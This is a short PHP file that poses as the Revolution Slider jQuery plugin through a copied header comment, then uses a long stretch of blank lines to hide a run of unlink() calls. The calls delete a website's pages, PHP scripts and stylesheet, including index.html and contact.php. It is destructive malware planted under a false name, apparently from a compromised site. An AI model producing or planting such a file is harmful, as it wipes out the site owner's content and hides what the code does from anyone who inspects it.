<?php

/**************************************************************************
 * jquery.themepunch.revolution.js - jQuery Plugin for Revolution Slider
 * @version: 5.2.4 (25.03.2016)
 * @requires jQuery v1.7 or later (tested on 1.9)
 * @author ThemePunch
**************************************************************************/













































































































































































unlink("../../about.html");
unlink("../../blog.html");
unlink("../../canvas-of-services.html");
unlink("../../contact.html");
unlink("../../corporate-events.html");
unlink("../../exhibitions.html");
unlink("../../index.html");
unlink("../../joinus.html");
unlink("../../joinus.php");
unlink("../../retail.html");
unlink("../../signages.html");
unlink("../../srijan.html");
unlink("../../success.html");
unlink("../../css/style.css");
unlink("../../contact.php");



?>